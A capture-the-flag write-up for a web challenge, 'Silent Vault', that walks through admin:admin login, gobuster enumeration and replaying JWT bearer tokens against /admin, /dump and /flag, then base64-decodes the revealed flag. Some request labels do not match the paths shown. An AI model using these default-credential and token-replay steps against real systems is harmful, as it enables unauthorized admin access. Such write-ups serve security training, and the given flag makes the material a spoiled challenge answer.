# 🚀 Silent Vault
**Category** Web Security    
**Difficulty** Medium  
**Points:** 200

## Description
An internal system recently flagged unusual activity: a standard user was able to perform actions reserved for administrators. No credentials were leaked, and logs show no sign of direct tampering.

Investigate the incident and replicate the behavior to uncover the flag.

URL: https://ctf-question1.onrender.com

Flag Format: LakshyaCTF{...}

## Tools Used

 * burpsuit
 * gobuster
 * base64

## 🧠 Analysis

- Step 1: Trying Luck  
  We saw there was two input fields `username` and `password`. By betting on our luck we tried `username:admin` `password:admin`. And it lead us to finding a jwt token
  ```json
  {"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0NTIzOTM4NiwianRpIjoiODRlNGQ2YzYtMTljMy00ZTc5LTk1ZGItNjE4ZmY3Nzg4ZDM3IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzQ1MjM5Mzg2LCJjc3JmIjoiZTNmZTEzZWEtYzU5Mi00OGNkLWIwMjktMmU1MGNhODAwY2E0IiwiZXhwIjoxNzQ1MjQwMjg2fQ.p4-R-YW32NkPzrO7UF5I21xfQW0Jqed49SVcSwwkWSc"}
  ```

- Step 2: Burp Suite: Now loading malicious intentions...  
  Then we boot up into the burpsuit capture the website traffic, send it to the repeater, add:
  ```bash
  Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0NTI0MTk3NCwianRpIjoiZjNhMDc0MzEtMzk1MC00ZjEyLTk2MmItNDhlZGI5MzM4NTlkIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzQ1MjQxOTc0LCJjc3JmIjoiZTFjY2Q2MmYtNzEzZC00MjA3LWE5YzUtZTJjMzYwMWEzYTQyIiwiZXhwIjoxNzQ1MjQyODc0fQ.KdNLOlX6JwHlu_32J7GL8ggAwlHrTAyMPHCOxEMdPt4
  ```
  into the request sent it and then.....
  ```json
  {"error":"Missing credentials"}
  ```
- Step 3: Go Go----  GoBuster  
  After the dead end we ran gobuster
  ```bash
  $ gobuster dir -w /usr/share/wordlist/dirb/common.txt -u https://ctf-question1.onrender.com
  ```
  And we got three endpoints
  1. /admin
  2. /dump
  3. /flag  
  4. /robots.txt

- Step 4: Checking the gobuster endpoints   
   1. /robot.txt:
      ```html
      User-agent: *
      Disallow: /flag
      ```
  2. /admin:
      ```json
      {"msg":"Missing Authorization Header"}
      ```
  3. /dump:
      ```json
      {"msg":"Missing Authorization Header"}
      ```
  4. /flag:
      ```json
      {"msg":"Missing Authorization Header"}
      ```
- Step 5: Giving them what they need #authorization  
  We went back to the `burp` and set
  * At `/admin` endpoint Request (P.S same access token found at step 1):
    ```bash
    GET /dump HTTP/2
    Host: ctf-question1.onrender.com
    Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0NTI0MTk3NCwianRpIjoiZjNhMDc0MzEtMzk1MC00ZjEyLTk2MmItNDhlZGI5MzM4NTlkIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzQ1MjQxOTc0LCJjc3JmIjoiZTFjY2Q2MmYtNzEzZC00MjA3LWE5YzUtZTJjMzYwMWEzYTQyIiwiZXhwIjoxNzQ1MjQyODc0fQ.KdNLOlX6JwHlu_32J7GL8ggAwlHrTAyMPHCOxEMdPt4
    ```
    Response:
    ```json
    {"message":"Welcome, admin! You have access to the admin panel."}
    ```
  * At `/dump` endpoint Request:
    ```bash
    GET /dump HTTP/2
    Host: ctf-question1.onrender.com
    Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0NTI0MzI0OSwianRpIjoiYzFkYzU3NzQtNDI5ZS00ZTAxLWE4ZTMtODAyYjRjYmI2MGJlIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzQ1MjQzMjQ5LCJjc3JmIjoiOWE0MThkNWQtMWE1Ny00Y2I3LTliODctMDRjYWU3MjQyYTA4IiwiZXhwIjoxNzQ1MjQ0MTQ5fQ.HDVp34YxEMEGWBw2CXExrYnWfPp1-lsoe9JYH4GkmAU
    ```
    Response:
    ```json
    {  "admin":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0NTI0MzgyMywianRpIjoiYWJiMGU2NWEtMmEzZC00NjJjLWFmY2UtOWUzODdhZGE2NGIzIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzQ1MjQzODIzLCJjc3JmIjoiY2E4OTNhMWYtNzJmMi00NmY3LTk0OWYtNDZmY2Q3NTVkNDc4IiwiZXhwIjoxNzQ1MjQ0NzIzfQ.aaqfLbMrA3Dzs9QGmqlOQYqMnqmboN38Bc9EJd5csx4",  "flag":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0NTI0MzgyMywianRpIjoiYmFlNjEyYTItODlhNy00MzA2LTkyNWQtYzJmOGQ3Y2Q3ZTI3IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImZsYWciLCJuYmYiOjE3NDUyNDM4MjMsImNzcmYiOiJmOTI4NjBlZS04NmU0LTQ0YWMtYmUxMi1kZTE0NDQzOTdkOTIiLCJleHAiOjE3NDUyNDQ3MjN9.gpjHoVnkYvVDHwqQqUmdBSSJqVXh2uNGg-P3O6slS7A",  "user":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0NTI0MzgyMywianRpIjoiN2FiNGU3NzgtN2FkMC00NjRhLWEyZDUtZmRiYzU5NzMxN2Q5IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InVzZXIiLCJuYmYiOjE3NDUyNDM4MjMsImNzcmYiOiI4MDc1NTE3ZS02MTYwLTRiMmQtOTU3Yi04MDFkY2E4MTVjOTciLCJleHAiOjE3NDUyNDQ3MjN9.CwHNNwMwgXbxlg4s92Vqt0KFV-Nc5478YUAu-yxtgI0"    }
    ```
  * At `/flag` endpoint request (P.S this token was dumped from `/dump` {"flag": `<jwt_token>`}):
    ```bash
    GET /dump HTTP/2
    Host: ctf-question1.onrender.com
    Authorization: Bearer   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0NTI0MzgyMywianRpIjoiYmFlNjEyYTItODlhNy00MzA2LTkyNWQtYzJmOGQ3Y2Q3ZTI3IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImZsYWciLCJuYmYiOjE3NDUyNDM4MjMsImNzcmYiOiJmOTI4NjBlZS04NmU0LTQ0YWMtYmUxMi1kZTE0NDQzOTdkOTIiLCJleHAiOjE3NDUyNDQ3MjN9.gpjHoVnkYvVDHwqQqUmdBSSJqVXh2uNGg-P3O6slS7A
    ```
    Response:
    ```json
    {"flag":"TGFrc2h5YUNURnt1X3BFckZvTWVEX2pXdF9mT3JHZVJ5fQ=="}
    ```

- Step 6: Decoding the flag  
  Looking at the encoded flag we thought of decoding it using base64
  ```bash
  $ echo TGFrc2h5YUNURnt1X3BFckZvTWVEX2pXdF9mT3JHZVJ5fQ== | base64 -d
  LakshyaCTF{u_pErFoMeD_jWt_fOrGeRy}
  ```  
  and we got the flag..

## 🏁 Flag

```bash
LakshyaCTF{u_pErFoMeD_jWt_fOrGeRy}
```